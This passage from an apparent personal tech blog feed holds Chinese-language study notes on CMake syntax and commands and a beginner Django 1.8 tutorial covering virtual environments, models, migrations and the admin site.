<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set(VAR a b c)</span><br><span class="line">Foreach(f $&#123;VAR&#125;)</span><br><span class="line">...</span><br><span class="line">Endforeach(f)</span><br><span class="line"></span><br><span class="line">--------</span><br><span class="line"></span><br><span class="line">WHILE()</span><br><span class="line">...</span><br><span class="line">ENDWHILE()</span><br></pre></td></tr></table></figure>

<h2 id="内部变量"><a href="#内部变量" class="headerlink" title="内部变量"></a>内部变量</h2><p><code>CMAKE_C_COMPILER</code> : 指定C编译器。</p>
<p><code>CMAKE_CXX_COMPILER</code> : 指定C++编译器</p>
<p><code>CMAKE_C_FLAGS</code> : 编译C文件时的选项，如 <code>-g</code> , 也可以通过 <code>add_definitions</code> 添加编译选项。</p>
<p><code>EXECUTABLE_OUTPUT_PATH</code> : 可执行文件的存放路径。</p>
<p><code>LIBRARY_OUTPUT_PATH</code> : 库文件路径。</p>
<p><code>CMAKE_BUILD_TYPE</code>: : <code>build</code> 类型(Debug, Release, …)，<code>CMAKE_BUILD_TYPE=Debug</code></p>
<p><code>BUILD_SHARED_LIBS</code> : Switch between shared and static libraries.</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code>project (HELLO)</code>   #指定项目名称，生成的VC项目的名称；</p>
<blockquote>
<p>使用${HELLO_SOURCE_DIR}表示项目根目录</p>
</blockquote>
<p><code>include_directories</code> : 指定头文件的搜索路径，相当于指定gcc的-I参数</p>
<blockquote>
<p>include_directories (${HELLO_SOURCE_DIR}&#x2F;Hello)  #增加Hello为include目录</p>
</blockquote>
<p><code>link_directories</code> : 动态链接库或静态链接库的搜索路径，相当于gcc的-L参数</p>
<blockquote>
<p>link_directories (${HELLO_BINARY_DIR}&#x2F;Hello)     #增加Hello为link目录</p>
</blockquote>
<p><code>add_subdirectory</code> : 包含子目录</p>
<blockquote>
<p>add_subdirectory (Hello)</p>
</blockquote>
<p><code>add_executable</code> : 编译可执行程序，指定编译，好像也可以添加.o文件</p>
<blockquote>
<p>add_executable (helloDemo demo.cxx demo_b.cxx)   #将cxx编译成可执行文件</p>
</blockquote>
<p><code>add_definitions</code> : 添加编译参数</p>
<blockquote>
<p>add_definitions(-DDEBUG)将在gcc命令行添加DEBUG宏定义；</p>
</blockquote>
<blockquote>
<p>add_definitions( “-Wall -ansi –pedantic –g”)</p>
</blockquote>
<p><code>target_link_libraries</code> : 添加链接库,相同于指定-l参数</p>
<blockquote>
<p>target_link_libraries(demo Hello) #将可执行文件与Hello连接成最终文件demo</p>
</blockquote>
<p><code>add_library</code>:</p>
<blockquote>
<p>add_library(Hello hello.cxx)  #将hello.cxx编译成静态库如libHello.a</p>
</blockquote>
<p><code>add_custom_target</code> :</p>
<p><code>message( status|fatal_error, “message”)</code> :</p>
<p><code>set_target_properties( ... )</code> : lots of properties… OUTPUT_NAME, VERSION, ….</p>
<p><code>link_libraries( lib1 lib2 ...)</code> : All targets link with the same set of libs</p>
<h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><ol>
<li>怎样获得一个目录下的所有源文件<blockquote>
<p>aux_source_directory(<dir> <variable>)</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>将dir中所有源文件（不包括头文件）保存到变量variable中，然后可以add_executable (ss7gw ${variable})这样使用。</p>
</blockquote>
<ol start="2">
<li><p>怎样指定项目编译目标</p>
<blockquote>
<p> project命令指定</p>
</blockquote>
</li>
<li><p>怎样添加动态库和静态库</p>
<blockquote>
<p>target_link_libraries命令添加即可</p>
</blockquote>
</li>
<li><p>怎样在执行CMAKE时打印消息</p>
<blockquote>
<p>message([SEND_ERROR | STATUS | FATAL_ERROR] “message to display” …)</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>注意大小写</p>
</blockquote>
<ol start="5">
<li>怎样指定头文件与库文件路径<blockquote>
<p>include_directories与link_directories</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>可以多次调用以设置多个路径</p>
</blockquote>
<blockquote>
<p>link_directories仅对其后面的targets起作用</p>
</blockquote>
<ol start="6">
<li>怎样区分debug、release版本<blockquote>
<p>建立debug&#x2F;release两目录，分别在其中执行cmake -DCMAKE_BUILD_TYPE&#x3D;Debug（或Release），需要编译不同版本时进入不同目录执行make即可；</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>Debug版会使用参数-g；Release版使用-O3 –DNDEBUG</p>
</blockquote>
<blockquote>
<p>另一种设置方法——例如DEBUG版设置编译参数DDEBUG</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(DEBUG_mode)</span><br><span class="line"></span><br><span class="line">    add_definitions(-DDEBUG)</span><br><span class="line"></span><br><span class="line">ENDIF()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在执行cmake时增加参数即可，例如cmake -D DEBUG_mode&#x3D;ON</p>
</blockquote>
<ol start="7">
<li>怎样设置条件编译<br>例如debug版设置编译选项DEBUG，并且更改不应改变CMakelist.txt</li>
</ol>
<blockquote>
<p>使用option command，eg：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">option(DEBUG_mode &quot;ON for debug or OFF for release&quot; ON)</span><br><span class="line"></span><br><span class="line">IF(DEBUG_mode)</span><br><span class="line"></span><br><span class="line">    add_definitions(-DDEBUG)</span><br><span class="line"></span><br><span class="line">ENDIF()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>使其生效的方法：首先cmake生成makefile，然后make edit_cache编辑编译选项；Linux下会打开一个文本框，可以更改，该完后再make生成目标文件——emacs不支持make edit_cache；</p>
</blockquote>
<blockquote>
<p>局限：这种方法不能直接设置生成的makefile，而是必须使用命令在make前设置参数；对于debug、release版本，相当于需要两个目录，分别先cmake一次，然后分别make edit_cache一次；</p>
</blockquote>
<blockquote>
<p>期望的效果：在执行cmake时直接通过参数指定一个开关项，生成相应的makefile——可以这样做，例如cmake –DDEBUGVERSION&#x3D;ON</p>
</blockquote>
<ol start="8">
<li><p>怎样添加编译宏定义</p>
<blockquote>
<p>使用add_definitions命令，见命令部分说明</p>
</blockquote>
</li>
<li><p>怎样添加编译依赖项用于确保编译目标项目前依赖项必须先构建好</p>
</li>
</ol>
<blockquote>
<p>add_dependencies</p>
</blockquote>
<ol start="10">
<li>怎样指定目标文件目录<blockquote>
<p>建立一个新的目录，在该目录中执行cmake生成Makefile文件，这样编译结果会保存在该目录——类似</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>SET_TARGET_PROPERTIES(ss7gw PROPERTIES RUNTIME_OUTPUT_DIRECTORY “${BIN_DIR}”)</p>
</blockquote>
<ol start="10">
<li><p>很多文件夹，难道需要把每个文件夹编译成一个库文件？</p>
<blockquote>
<p>可以不在子目录中使用CMakeList.txt，直接在上层目录中指定子目录</p>
</blockquote>
</li>
<li><p>怎样设定依赖的cmake版本</p>
<blockquote>
<p>cmake_minimum_required(VERSION 2.6)</p>
</blockquote>
</li>
<li><p>相对路径怎么指定</p>
<blockquote>
<p>${projectname_SOURCE_DIR}表示根源文件目录，${ projectname _BINARY_DIR}表示根二进制文件目录？</p>
</blockquote>
</li>
<li><p>怎样设置编译中间文件的目录</p>
<blockquote>
<p>TBD</p>
</blockquote>
</li>
<li><p>怎样在IF语句中使用字串或数字比较</p>
<blockquote>
<p>数字比较LESS、GREATER、EQUAL，字串比STRLESS、STRGREATER、STREQUAL，</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>Eg：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set(CMAKE_ALLOW_LOOSE_LOOP_CONSTRUCTS ON)</span><br><span class="line"></span><br><span class="line">set(AAA abc)</span><br><span class="line"></span><br><span class="line">IF(AAA STREQUAL abc)</span><br><span class="line"></span><br><span class="line">    message(STATUS &quot;true&quot;)   #应该打印true</span><br><span class="line"></span><br><span class="line">ENDIF()</span><br></pre></td></tr></table></figure>
<ol start="15">
<li><p>更改h文件时是否只编译必须的cpp文件</p>
<blockquote>
<p>是</p>
</blockquote>
</li>
<li><p>机器上安装了VC7和VC8，CMAKE会自动搜索编译器，但是怎样指定某个版本？</p>
<blockquote>
<p>TBD</p>
</blockquote>
</li>
<li><p>怎样根据OS指定编译选项</p>
<blockquote>
<p>IF( APPLE ); IF( UNIX ); IF( WIN32 )</p>
</blockquote>
</li>
<li><p>能否自动执行某些编译前、后命令？</p>
<blockquote>
<p>可以，TBD</p>
</blockquote>
</li>
<li><p>怎样打印make的输出<br>make VERBOSE&#x3D;1</p>
</li>
</ol>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Django学习-入门</title>
    <url>/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h1><p>虚拟环境其实就是对真实 python 环境的复制，这样我们在复制的 python 环境中安装包就不会影响到真实的 python 环境，在不同的虚拟环境中开发项目就实现了项目之间的隔离。</p>
<h2 id="virtualenvwrapper-虚拟环境"><a href="#virtualenvwrapper-虚拟环境" class="headerlink" title="virtualenvwrapper 虚拟环境"></a>virtualenvwrapper 虚拟环境</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>首先安装虚拟环境，命令如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pip3 install virtualenv</span><br></pre></td></tr></table></figure>

<p>接下来还要安装虚拟环境扩展包，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure>

<p>安装虚拟环境包装器的目的是使用更加简单的命令来管理虚拟环境。</p>
<p>修改 home 目录下的配置文件 <code>.bashrc</code> ，添加如下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> WORKEON_HOME=<span class="variable">$HOME</span>/.virtualenvs</span><br><span class="line"><span class="built_in">source</span> /usr/local/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure>

<p>这里运行可能会出现 <code>/usr/bin/python: No module named virtualenvwrapper</code> 错误，修改 <code>/usr/local/bin/virtualenvwrapper.sh</code> 如下即可：</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-13-21-35-50.png" class="">

<p>使用 <code>source .bashrc</code> 命令使配置文件生效。</p>
<p>创建 python3 虚拟环境命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkvirtualenv -p python env_name</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-13-21-40-39.png" class="">

<p>可以看到已经创建了一个虚拟环境<code>/home/ckcat/.virtualenvs/django_study</code>，并且自动进入了该虚拟环境。</p>
<h3 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h3><p>退出虚拟环境的命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-13-21-45-12.png" class="">

<h3 id="查看和使用"><a href="#查看和使用" class="headerlink" title="查看和使用"></a>查看和使用</h3><p>查看所有虚拟环境命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">workon 两次tab键</span><br></pre></td></tr></table></figure>

<p>使用命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">workon env_name</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-13-21-48-46.png" class="">

<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>删除虚拟环境使用如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rmvirtualenv env_name</span><br></pre></td></tr></table></figure>

<p>但是删除前，必须先退出虚拟环境，例如：</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-13-21-51-42.png" class="">

<h3 id="包操作"><a href="#包操作" class="headerlink" title="包操作"></a>包操作</h3><p>在虚拟环境中使用 pip 命令操作 python 包，安装命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install packegename</span><br></pre></td></tr></table></figure>

<p>查看以安装的 python 包命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip list</span><br><span class="line">pip freeze</span><br></pre></td></tr></table></figure>

<h2 id="pipenv"><a href="#pipenv" class="headerlink" title="pipenv"></a>pipenv</h2><p>Pipenv 是 Python 项目的依赖管理器。</p>
<h2 id="安装-django-包"><a href="#安装-django-包" class="headerlink" title="安装 django 包"></a>安装 django 包</h2><p>本次学习中使用的是 <code>django1.8.2</code> 的版本，安装命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install django==1.8.2</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-13-21-58-25.png" class="">

<p>至此，整个虚拟环境搭建完成，下面开始创建项目。</p>
<h1 id="2-创建项目"><a href="#2-创建项目" class="headerlink" title="2. 创建项目"></a>2. 创建项目</h1><p>首先选定好项目的存放目录，我这里存放在 <code>/home/ckcat/code/PythonProjects/Django_Study</code> ，使用如下命令创建项目：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">django-admin startproject project_name</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-13-22-04-29.png" class="">

<p>目录结构：</p>
<ul>
<li><code>manage.py</code> 是项目管理文件，通过他管理项目。</li>
<li><code>test01</code> 与项目同名的目录。</li>
<li><code>_init_.py</code> 是一个空文件，作用是这个目录<code>test01</code>可以被当作包使用。</li>
<li><code>settings.py</code> 是项目的整体配置文件。</li>
<li><code>urls.py</code> 是项目的 URL 配置文件。</li>
<li><code>wsgi.py</code> 是项目与 WSGI 兼容的 WEB 服务器入口。</li>
</ul>
<p>接下来可以使用 pycharm 打开该项目。</p>
<h2 id="2-1-创建应用"><a href="#2-1-创建应用" class="headerlink" title="2.1. 创建应用"></a>2.1. 创建应用</h2><p>使用一个应用开发一个业务模块，此处创建应用名称为 booktest,创建应用命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py startapp booktest</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-13-22-15-11.png" class="">

<p>目录结构：</p>
<ul>
<li><code>_init_.py</code> 是一个空文件，作用是这个目录<code>booktest</code>可以被当作包使用。</li>
<li><code>tests.py</code> 用于开发测试用例。</li>
<li><code>models.py</code> 与数据库操作相关。</li>
<li><code>views.py</code> 与接收浏览器请求，进行处理，返回页面相关。</li>
<li><code>admin.py</code> 与网站后台管理相关。</li>
</ul>
<h2 id="2-2-安装应用"><a href="#2-2-安装应用" class="headerlink" title="2.2. 安装应用"></a>2.2. 安装应用</h2><p>应用创建完成后需要安装才可以使用，在<code>settings.py</code> 中 <code>INSTALLED_APPS</code> 下添加应用名称就可以完成安装。</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-13-22-23-28.png" class="">

<h2 id="2-3-开发服务器"><a href="#2-3-开发服务器" class="headerlink" title="2.3. 开发服务器"></a>2.3. 开发服务器</h2><p>在开发阶段，为了能快速预览到开发的效果，django 提供了一个纯 python 编写的轻量级 web 服务器，仅在开发阶段使用，运行命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py runserver ip:port</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ip 和端口默认为 127.0.0.1:8000</p>
</blockquote>
<p>例如：</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-13-22-29-24.png" class="">

<p>接着在浏览器中输入网址 <code>127.0.0.1:8000</code> 可以查看当前站点的开发效果，如下图所示：</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-13-22-31-12.png" class="">

<h1 id="3-设计模型"><a href="#3-设计模型" class="headerlink" title="3. 设计模型"></a>3. 设计模型</h1><h2 id="3-1-ORM-框架"><a href="#3-1-ORM-框架" class="headerlink" title="3.1. ORM 框架"></a>3.1. ORM 框架</h2><p>O 是 object，也就是类对象的意思，R 是 relation，也就是关系数据库中数据表的意思，M 是 Mapping，是映射的意思。在 ORM 框架中，它帮助我们把类和数据表进行了一个映射，可以让我们通过类和类对象就能操作它所对应的表格中的数据。ORM 框架还有一个功能，它可以根据我们设计的类自动帮我们生成数据库中的表格，省去了我们自己建表的过程。</p>
<p>django 中内嵌了 ORM 框架，不需要直接面向数据库编程，而是定义模型类，通过模型类和对象完成数据表的增删改查操作。</p>
<p>使用 django 进行数据库开发的步骤如下：</p>
<ol>
<li>在 models.py 中定义模型类。</li>
<li>迁移。</li>
<li>通过类和对象完成数据增删改查。</li>
</ol>
<h2 id="3-2-定义模型类"><a href="#3-2-定义模型类" class="headerlink" title="3.2. 定义模型类"></a>3.2. 定义模型类</h2><p>模型类定义在 models.py 文件中，继承自 models.Model 类。</p>
<blockquote>
<p>说明：不需要定义主键列，在生成时会自动添加，并且值自动增长。</p>
</blockquote>
<h3 id="3-2-1-设计图书类"><a href="#3-2-1-设计图书类" class="headerlink" title="3.2.1. 设计图书类"></a>3.2.1. 设计图书类</h3><p>读书类：</p>
<ul>
<li>类名 : BookInfo</li>
<li>读书名称 : btitle</li>
<li>读书发布日期 : bpub_date</li>
</ul>
<h3 id="3-2-2-模型类设计"><a href="#3-2-2-模型类设计" class="headerlink" title="3.2.2. 模型类设计"></a>3.2.2. 模型类设计</h3><p>根据设计，在 models.py 中定义模型类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line"># Create your models here.</span><br><span class="line">class BookInfo(models.Model):</span><br><span class="line">    btitle = models.CharField(max_length=20)</span><br><span class="line">    bpub_date = models.DateField()</span><br></pre></td></tr></table></figure>

<h2 id="3-3-迁移"><a href="#3-3-迁移" class="headerlink" title="3.3. 迁移"></a>3.3. 迁移</h2><p>迁移前目录结构如下图：</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-15-03-30.png" class="">

<p>迁移由两步完成：</p>
<ol>
<li>生成迁移文件：根据模型类生成创建表的迁移文件。</li>
<li>执行迁移：根据第一步生成的迁移文件在数据库中创建表。</li>
</ol>
<p>生成迁移文件命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-15-07-55.png" class="">

<p>执行生成迁移文件命令后，会在应用 booktest 目录下的 migrations 目录中生成迁移文件，内容如下：</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-15-11-16.png" class="">

<p>django 框架根据我们设计的模型类生成了迁移文件，在迁移文件中我们可以看到 fields 列表中每一个元素跟 BookInfo 类属性名以及属性的类型是一致的。同时我们发现一个 id 项，这一项是 django 框架帮我们自动生成的，在创建表的时候 id 就会作为对应的主键列，并且主键列自动增长。</p>
<p>执行迁移命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-15-16-36.png" class="">

<p>执行迁移命令后，将会生成对应的 sqlite3 数据库文件，数据表默认名称为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;app_name&gt;_&lt;model_name&gt;</span><br><span class="line">例如：</span><br><span class="line">booktest_bookinfo</span><br></pre></td></tr></table></figure>

<h3 id="3-3-1-设计英雄类"><a href="#3-3-1-设计英雄类" class="headerlink" title="3.3.1. 设计英雄类"></a>3.3.1. 设计英雄类</h3><p>英雄类：</p>
<ul>
<li>类名 : HeroInfo</li>
<li>英雄名 : hname</li>
<li>英雄性别 : hgender</li>
<li>英雄简介 : hcomment</li>
<li>英雄所属读书 : hbook</li>
<li>读书-英雄的关系为一对多</li>
</ul>
<p>打开 booktest&#x2F;models.py , 定义英雄类代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class HeroInfo(models.Model):</span><br><span class="line">    hname = models.CharField(max_length=20)</span><br><span class="line">    hgender = models.BooleanField()</span><br><span class="line">    hcomment = models.CharField(max_length=100)</span><br><span class="line">    hbook = models.ForeignKey(&quot;BookInfo&quot;) # BookInfo 作为 HeroInfo 的外键。</span><br></pre></td></tr></table></figure>

<p>生成迁移文件，并执行迁移：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-15-32-21.png" class="">

<p>之后将会生成 booktest_HeroInfo 表，并且 hbook 字段将会变成 hbook_id 对应 booktest_BookInfo 中的主键。</p>
<h2 id="3-4-数据操作"><a href="#3-4-数据操作" class="headerlink" title="3.4. 数据操作"></a>3.4. 数据操作</h2><p>完成数据表的迁移之后，就可以通过进入项目的 shell 进行简单的 API 操作。如果需要退出可以使用 <code>ctrl+d</code> 或者输入 <code>quit()</code> .</p>
<p>进入项目 shell :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyhotn manage.py shell</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-15-38-59.png" class="">

<p>首先引入 booktest&#x2F;models 中的类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from booktest.models import BookInfo, HeroInfo</span><br></pre></td></tr></table></figure>

<p>查询所有图书信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BookInfo.objects.all()</span><br></pre></td></tr></table></figure>

<p>新建图书对象，并查看所有图书信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b = BookInfo()</span><br><span class="line">b.btitle = &quot;射雕英雄传&quot;</span><br><span class="line">from datetime import date</span><br><span class="line">b.bpub_date=date(1990,1,23)</span><br><span class="line">b.save()</span><br><span class="line">BookInfo.objects.all()</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-15-44-42.png" class="">

<p>查找图书信息并查看值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; b=BookInfo.objects.get(id=1)</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">&lt;BookInfo: BookInfo object&gt;</span><br><span class="line">&gt;&gt;&gt; b.id</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; b.btitle</span><br><span class="line">&#x27;射雕英雄传&#x27;</span><br><span class="line">&gt;&gt;&gt; b.bpub_date</span><br><span class="line">datetime.date(1990, 1, 23)</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-15-47-06.png" class="">

<p>修改图书信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; b.bpub_date=date(2019,12,14)</span><br><span class="line">&gt;&gt;&gt; b.save</span><br><span class="line">&lt;bound method Model.save of &lt;BookInfo: BookInfo object&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; b.bpub_date</span><br><span class="line">datetime.date(2019, 12, 14)</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-15-49-14.png" class="">

<p>删除读书信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.delete()</span><br></pre></td></tr></table></figure>

<h3 id="3-4-1-对象关联操作"><a href="#3-4-1-对象关联操作" class="headerlink" title="3.4.1. 对象关联操作"></a>3.4.1. 对象关联操作</h3><p>创建一个 HeroInfo 对象：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; h=HeroInfo()</span><br><span class="line">&gt;&gt;&gt; h.hname=&quot;黄蓉&quot;</span><br><span class="line">&gt;&gt;&gt; h.hgender=False</span><br><span class="line">&gt;&gt;&gt; h.hcomment=&quot;她是女主角&quot;</span><br><span class="line">&gt;&gt;&gt; h.hbook=b</span><br><span class="line">&gt;&gt;&gt; h.save()</span><br></pre></td></tr></table></figure>

<p>图书与英雄是一对多的关系，django 中提供了关联的操作方式。<br>获得关联集合，返回当前 book 对象的所有 hero 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; b.heroinfo_set.all()</span><br><span class="line">[&lt;HeroInfo: HeroInfo object&gt;]</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-15-57-11.png" class="">

<h1 id="4-后台管理"><a href="#4-后台管理" class="headerlink" title="4. 后台管理"></a>4. 后台管理</h1><p>使用 django 后台管理需要安装如下步骤操作：</p>
<ol>
<li>管理页面本地化</li>
<li>管理管理员</li>
<li>注册模型类</li>
<li>自定义管理页面</li>
</ol>
<h2 id="4-1-管理页面本地化"><a href="#4-1-管理页面本地化" class="headerlink" title="4.1. 管理页面本地化"></a>4.1. 管理页面本地化</h2><p>本地化是将显示的语言、时间等使用本地的习惯。<br>打开 <code>test01/settings.py</code> 文件，找到语言编码、时区的设置，将内容改为如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LANGUAGE_CODE = &#x27;zh-hans&#x27; #&#x27;en-us&#x27;使用中文</span><br><span class="line">TIME_ZONE = &#x27;Asia/Shanghai&#x27; #&#x27;UTC&#x27; 设置上海时区</span><br></pre></td></tr></table></figure>

<h2 id="4-2-创建管理员"><a href="#4-2-创建管理员" class="headerlink" title="4.2. 创建管理员"></a>4.2. 创建管理员</h2><p>创建管理员命令如下，按提示输入用户名，邮箱，密码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py createsuperuser</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-16-07-08.png" class="">

<p>接下来启动服务器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure>

<p>在浏览器中打开如下地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8000/admin/</span><br></pre></td></tr></table></figure>

<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-16-10-01.png" class="">

<p>输入刚才创建的用户名和密码，进入管理页面。</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-16-11-29.png" class="">

<h2 id="4-3-注册模型类"><a href="#4-3-注册模型类" class="headerlink" title="4.3. 注册模型类"></a>4.3. 注册模型类</h2><p>登陆后台管理后，默认没有我们创建的应用中定义的模型类，需要在自己应用中的 admin.py 文件中注册，才可以在后台管理中看到，并进行增删查找操作。</p>
<p>打开 <code>booktest/admin.py</code> 文件，编写如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.contrib import admin</span><br><span class="line"></span><br><span class="line"># Register your models here.</span><br><span class="line">from booktest.models import BookInfo, HeroInfo</span><br><span class="line"></span><br><span class="line">admin.site.register(BookInfo)</span><br><span class="line">admin.site.register(HeroInfo)</span><br></pre></td></tr></table></figure>

<p>刷新浏览器页面，可以看到模型类 BookInfo 和 HeroInfo 的管理了。</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-16-18-42.png" class="">

<h2 id="4-4-自定义管理页面"><a href="#4-4-自定义管理页面" class="headerlink" title="4.4. 自定义管理页面"></a>4.4. 自定义管理页面</h2><p>在列表中只显示了 BookInfo object ，对象的其他属性并没有列出来，查看非常不方便。Django 提供了自定义管理页面的功能。</p>
<p>打开 <code>booktest/admin.py</code> 文件，自定义类，继承自 <code>admin.ModelAdmin</code> 类。</p>
<ul>
<li>属性 list_display 表示要显示哪些属性</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class BookInfoAdmin(admin.ModelAdmin):</span><br><span class="line">    list_display = [&#x27;id&#x27;, &#x27;btitle&#x27;, &#x27;bpub_date&#x27;]</span><br></pre></td></tr></table></figure>

<ul>
<li>修改该模型类 BookInfo 的注册代码如下</li>
</ul>
